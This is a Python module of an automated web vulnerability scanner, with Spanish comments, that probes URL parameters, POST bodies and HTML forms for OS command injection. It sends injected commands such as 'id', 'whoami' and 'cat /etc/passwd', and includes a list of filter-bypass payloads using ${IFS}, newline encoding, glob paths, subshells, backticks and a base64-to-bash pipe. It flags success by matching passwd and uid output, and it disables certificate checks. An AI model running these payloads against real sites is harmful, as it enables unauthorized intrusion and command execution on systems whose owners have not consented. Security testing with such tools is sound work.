import requests
import random
import re
from parametizer.bounded_pool import run_threadpool_pending_bounded
from urllib.parse import urlparse, parse_qs, urljoin, quote
from bs4 import BeautifulSoup
from colorama import init, ansi
from parametizer.progress import update_progress, print_vulnerability
from parametizer.core.headers import get_headers
import urllib3
import threading
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from vulnerability_manager import vuln_manager

init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_STATIC_EXTENSIONS = (
    ".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg",
    ".woff", ".woff2", ".ico", ".ttf", ".eot", ".mp4", ".webm", ".pdf",
)

_TRACKING_PARAMS: frozenset = frozenset({
    "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content",
    "utm_id", "utm_reader", "utm_name", "utm_placing",
    "fbclid", "gclid", "msclkid", "dclid", "twclid",
    "_ga", "_gid", "_gl", "_hsenc", "_hsmi",
    "mc_eid", "mc_cid",
    "ref", "referrer",
})

_HASHED_PAGE_RE = re.compile(r'^[0-9a-f]{6,}_page$', re.IGNORECASE)


def _is_static_path(url: str) -> bool:
    path = urlparse(url).path.lower()
    return path.endswith(_STATIC_EXTENSIONS)


def _is_non_injectable_param(param: str) -> bool:
    p = param.lower()
    return p in _TRACKING_PARAMS or bool(_HASHED_PAGE_RE.match(p))


rce_params = [
    "cmd", "exec", "execute", "run", "input", "query", "command",
    "cli", "process", "action", "call", "shell", "code", "eval",
    "file", "path", "dir", "template", "filename", "load",
    "source", "data", "script", "ping", "host", "domain",
    "ip", "target", "url", "endpoint", "syscmd", "system",
]

_RCE_ECHO_MARKER = "3141592653589793"

def is_rce_response(text):
    """Detecta output REAL de comandos del sistema.
    El marcador echo (_RCE_ECHO_MARKER) se evalúa por separado con reflection-check
    para evitar FPs en CMSs que reflejan el valor del parámetro tal cual."""
    rce_output_patterns = [
        "root:x:0:0:", "daemon:x:1:1:", "bin:x:2:2:", "nobody:x:",
        "uid=0(root)", "uid=0(root) gid=0(", "uid=33(www-data)", "uid=1000(", "gid=0(root)",
        "linux version ",
        "windows ip configuration", "ethernet adapter",
        "inet 127.0.0.1", "inet addr:127.",
    ]
    lower = text.lower()
    return any(pat.lower() in lower for pat in rce_output_patterns)


# ---------------------------------------------------------------------------
# BYPASS PAYLOADS PARA RCE
# Usados cuando el payload inicial no produce output real.
# Cubren: filtros de espacio (${IFS}), filtros de operadores (newline),
# filtros de keywords (alternativas a cat/id/ifconfig), encoding.
# ---------------------------------------------------------------------------

_RCE_BYPASS_PAYLOADS: list = [
    # Bypass de filtro de espacio con ${IFS}
    "|${IFS}id",
    ";${IFS}id",
    "&&${IFS}id",
    "|${IFS}cat${IFS}/etc/passwd",
    ";${IFS}cat${IFS}/etc/passwd",
    # Newline injection (bypass de filtros de ; y |)
    "%0aid",
    "%0acat%20/etc/passwd",
    "%0awhoami",
    # Comandos alternativos (si id/cat filtrados)
    "| whoami",
    "; whoami",
    "&& whoami",
    "| type%20C:\\Windows\\System32\\drivers\\etc\\hosts",
    # Glob en lugar de path literal (bypass de filtros de path)
    ";/???/??t${IFS}/etc/passwd",
    ";/usr/bin/id",
    # Subshell anidado
    "|$(id)",
    ";$(cat${IFS}/etc/passwd)",
    # Backtick alternativo
    "`whoami`",
    "`id`",
    # Encoding hex del comando
    "| {echo,aWQ=}|{base64,-d}|bash",
]


def _rce_detect_filter(payload_used: str, response_text: str) -> str:
    """
    Intenta detectar qué tipo de filtro bloqueó la ejecución del comando.
    Retorna: 'space_filter' | 'operator_filter' | 'keyword_filter' | 'unknown'
    Solo llamar cuando is_rce_response(text) == False pero hay evidencia de
    que el endpoint procesa comandos (respuesta diferente al baseline).
    """
    lower = response_text.lower()
    # Si el payload tiene pipe/semi pero la respuesta no los refleja → filtro de operadores
    if ("|" in payload_used or ";" in payload_used) and "|" not in lower and ";" not in lower:
        return "operator_filter"
    # Si el espacio del payload fue eliminado
    if " " in payload_used and payload_used.replace(" ", "") in lower:
        return "space_filter"
    # Si hay output parcial (el comando llegó pero fue filtrado)
    if any(kw in lower for kw in ["permission denied", "command not found", "not recognized"]):
        return "keyword_filter"
    return "unknown"


def _param_reflects_marker(method: str, url: str, all_params: dict, target_param: str,
                             headers: dict) -> bool:
    """Devuelve True si el parámetro refleja el marcador como valor plano
    (sin operadores de inyección). Usado para descartar FPs de echo-based detection."""
    plain_data = {k: _RCE_ECHO_MARKER if k == target_param else "TEST123" for k in all_params}
    try:
        if method == "get":
            r = requests.get(url, params=plain_data, headers=headers, verify=False, timeout=5)
        else:
            r = requests.post(url, data=plain_data, headers=headers, verify=False, timeout=5)
        return _RCE_ECHO_MARKER in r.text
    except Exception:
        return True  # En caso de error, asumir que refleja (conservador: no reportar)

def rce(urip, urif, wordlist, urls_vulnerables, threads, custom_headers, random_agent):
    print('\033[1;36m<<<<<<<<<<<<\033[0m Testing Remote Code Execution \033[1;36m>>>>>>>>>>>>>>\033[0m')
    print()
    total_tasks = (len(urip) * 2 + len(urif)) * len(wordlist)
    current = 0
    found = []
    lock = threading.Lock()
    vulnerable_endpoints = set()
    
    # Cache para baselines y endpoints vulnerables
    baseline_cache = {}
    form_cache = {}
    stdout_lock = threading.Lock()

    def get_baseline_response(method, url, data=None):
        try:
            # Solo hacer request si hay datos, sino retornar string vacío
            if not data:
                return ""
                
            headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
            neutral_data = {k: "TEST123" for k in data}
            
            if method == "post":
                r = requests.post(url, data=neutral_data, headers=headers, verify=False, timeout=5)
            elif method == "get":
                r = requests.get(url, params=neutral_data, headers=headers, verify=False, timeout=5)
            else:
                return ""
            
            # Solo retornar texto si la respuesta es exitosa
            if r.status_code == 200:
                return r.text.lower()
            return ""
        except requests.exceptions.Timeout:
            return ""  # Timeout específico
        except requests.exceptions.RequestException:
            return ""  # Otros errores de requests
        except Exception:
            return ""  # Cualquier otro error

    def test_url(url, payload):
        nonlocal current
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = parse_qs(parsed.query)

        if not qs or base_url in vulnerable_endpoints or _is_static_path(url):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        for param in qs:
            if _is_non_injectable_param(param):
                continue

            data = {k: payload if k == param else "TEST123" for k in qs}
            headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)

            # Cache de baseline para GET
            baseline_key = f"GET-{base_url}-{','.join(data.keys())}"
            if baseline_key not in baseline_cache:
                baseline_cache[baseline_key] = get_baseline_response("get", base_url, data)
            baseline = baseline_cache[baseline_key]

            try:
                r = requests.get(base_url, params=data, headers=headers, verify=False, timeout=5)
                
                # Determinar si hay evidencia de RCE real
                has_real_output = is_rce_response(r.text)
                # Echo marker: solo válido si el parámetro NO refleja el marcador como valor plano
                has_echo_marker = _RCE_ECHO_MARKER in r.text
                if has_echo_marker and not has_real_output:
                    reflect_key = f"REFLECT-GET-{base_url}-{param}"
                    if reflect_key not in baseline_cache:
                        baseline_cache[reflect_key] = _param_reflects_marker(
                            "get", base_url, qs, param, headers)
                    if baseline_cache[reflect_key]:
                        has_echo_marker = False  # El CMS refleja cualquier valor → no es RCE

                if r.status_code == 200 and (
                    (has_real_output or has_echo_marker)
                    and r.text.lower() != baseline
                    and abs(len(r.text) - len(baseline)) > 50
                ):
                    with lock:
                        if base_url not in vulnerable_endpoints:
                            vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                            with stdout_lock:
                                encoded = quote(payload, safe='')
                                print_vulnerability(f"\033[1;32m[GET][VULNERABLE]\033[0m {base_url}?{param}={encoded}")
                            urls_vulnerables.append(f"{base_url}?{param}={encoded}")
                    break

                # ── BYPASS LAYER: respuesta cambió pero no hubo output real ──
                # Solo intentar si la respuesta difiere del baseline (endpoint activo)
                # y aún no está en vulnerable_endpoints
                elif (r.status_code == 200
                      and not has_real_output
                      and r.text.lower() != baseline
                      and abs(len(r.text) - len(baseline)) > 100
                      and base_url not in vulnerable_endpoints):
                    for bp in _RCE_BYPASS_PAYLOADS:
                        bp_data = {k: bp if k == param else "TEST123" for k in qs}
                        try:
                            rb = requests.get(base_url, params=bp_data, headers=headers,
                                              verify=False, timeout=5)
                            if rb.status_code == 200 and is_rce_response(rb.text):
                                with lock:
                                    if base_url not in vulnerable_endpoints:
                                        vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                                        with stdout_lock:
                                            encoded = quote(bp, safe='')
                                            print_vulnerability(f"\033[1;32m[GET-BYPASS][VULNERABLE]\033[0m {base_url}?{param}={encoded}")
                                        entry = f"{base_url}?{param}={encoded}"
                                        entry += f"|||BYPASS_TECHNIQUE:RCE-BYPASS|||BYPASS_ORIGINAL:{quote(payload, safe='')}"
                                        urls_vulnerables.append(entry)
                                break
                        except Exception:
                            continue

            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
                
        with lock:
            current += 1
            update_progress(current, total_tasks)

    def test_post(url, payload):
        nonlocal current
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = parse_qs(parsed.query)

        if base_url in vulnerable_endpoints or not qs or _is_static_path(url):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        for param in qs:
            if _is_non_injectable_param(param):
                continue

            data = {k: payload if k == param else "TEST123" for k in qs}
            headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)

            # Cache de baseline para POST
            baseline_key = f"POST-{base_url}-{','.join(data.keys())}"
            if baseline_key not in baseline_cache:
                baseline_cache[baseline_key] = get_baseline_response("post", base_url, data)
            baseline = baseline_cache[baseline_key]

            try:
                r = requests.post(base_url, data=data, headers=headers, verify=False, timeout=5)
                
                has_real_output = is_rce_response(r.text)
                has_echo_marker = _RCE_ECHO_MARKER in r.text
                if has_echo_marker and not has_real_output:
                    reflect_key = f"REFLECT-POST-{base_url}-{param}"
                    if reflect_key not in baseline_cache:
                        baseline_cache[reflect_key] = _param_reflects_marker(
                            "post", base_url, qs, param, headers)
                    if baseline_cache[reflect_key]:
                        has_echo_marker = False

                if r.status_code == 200 and (
                    (has_real_output or has_echo_marker)
                    and r.text.lower() != baseline
                    and abs(len(r.text) - len(baseline)) > 50
                ):
                    with lock:
                        if base_url not in vulnerable_endpoints:
                            vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                            
                            # Salida sincronizada usando la nueva función
                            with stdout_lock:
                                encoded = quote(payload, safe='')
                                print_vulnerability(f"\033[1;32m[POST][VULNERABLE]\033[0m {base_url}?{param}={encoded}")
                            
                            urls_vulnerables.append(f"{base_url}?{param}={encoded}")
                    break
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
                
        with lock:
            current += 1
            update_progress(current, total_tasks)

    def test_form(url, payload):
        nonlocal current
        try:
            # Cache de formularios para evitar re-parsing
            if url not in form_cache:
                r = requests.get(url, headers=get_headers(random_agent=random_agent, custom_headers=custom_headers), timeout=7)
                soup = BeautifulSoup(r.text, "html.parser")
                forms = soup.find_all("form")
                form_cache[url] = forms
            else:
                forms = form_cache[url]
                
            for form in forms:
                action = form.get("action")
                method = form.get("method", "get").lower()
                inputs = form.find_all("input")
                data = {}
                for i in inputs:
                    name = i.get("name")
                    if name and not _is_non_injectable_param(name):
                        data[name] = payload

                if not data:
                    continue

                full_url = urljoin(url, action) if action else url
                headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
                
                # Cache de baseline para formularios
                baseline_key = f"{method}-{full_url}-{','.join(data.keys())}"
                if baseline_key not in baseline_cache:
                    baseline_cache[baseline_key] = get_baseline_response(method, full_url, data)
                baseline = baseline_cache[baseline_key]

                if method == "post":
                    res = requests.post(full_url, data=data, headers=headers, timeout=5)
                else:
                    res = requests.get(full_url, params=data, headers=headers, timeout=5)

                has_real_output = is_rce_response(res.text)
                has_echo_marker = _RCE_ECHO_MARKER in res.text
                if has_echo_marker and not has_real_output:
                    # Reflection check para forms: enviar el marcador en TODOS los campos
                    # simultáneamente (igual que el payload real). Si el marcador aparece
                    # así, es simple reflection del form (ej: el campo "name" refleja su value).
                    # Testar solo el primer campo individualmente genera FPs porque otro campo
                    # puede ser el que refleja.
                    reflect_key = f"REFLECT-FORM-{method}-{full_url}"
                    if reflect_key not in baseline_cache:
                        plain_all = {k: _RCE_ECHO_MARKER for k in data}
                        try:
                            if method == "post":
                                r_plain = requests.post(full_url, data=plain_all, headers=headers,
                                                        verify=False, timeout=5)
                            else:
                                r_plain = requests.get(full_url, params=plain_all, headers=headers,
                                                       verify=False, timeout=5)
                            baseline_cache[reflect_key] = _RCE_ECHO_MARKER in r_plain.text
                        except Exception:
                            baseline_cache[reflect_key] = True  # conservador: asumir refleja
                    if baseline_cache[reflect_key]:
                        has_echo_marker = False

                if res.status_code == 200 and (
                    (has_real_output or has_echo_marker)
                    and res.text.lower() != baseline
                    and abs(len(res.text) - len(baseline)) > 50
                ):
                    with lock:
                        if full_url not in vulnerable_endpoints:
                            vulnerable_endpoints.add(full_url)
                            
                            # Salida sincronizada usando la nueva función
                            with stdout_lock:
                                encoded_data = {k: quote(v, safe='') for k, v in data.items()}
                                print_vulnerability(f"\033[1;32m[FORM][VULNERABLE]\033[0m {full_url}\n{encoded_data}")
                            
                            urls_vulnerables.append(f"{full_url}")
        except requests.exceptions.Timeout:
            pass  # Skip timeouts silently
        except requests.exceptions.RequestException:
            pass  # Skip other request errors
        except Exception:
            pass  # Skip any other errors
            
        with lock:
            current += 1
            update_progress(current, total_tasks)

    def _iter_rce_tasks():
        for url in urip:
            for payload in wordlist:
                yield (test_url, url, payload)
                yield (test_post, url, payload)
        for url in urif:
            for payload in wordlist:
                yield (test_form, url, payload)

    run_threadpool_pending_bounded(_iter_rce_tasks(), threads)

    # Limpiar salida final
    with stdout_lock:
        sys.stdout.write('\r' + ansi.clear_line())
        sys.stdout.flush()
        print()
    if vulnerable_endpoints:
        print(f'\033[1;36m[+] Found {len(vulnerable_endpoints)} potential RCE vulnerabilities\033[0m')
    else:
        print('\033[1;31m[-] No RCE vulnerabilities found\033[0m')
    print()
    
    return urls_vulnerables
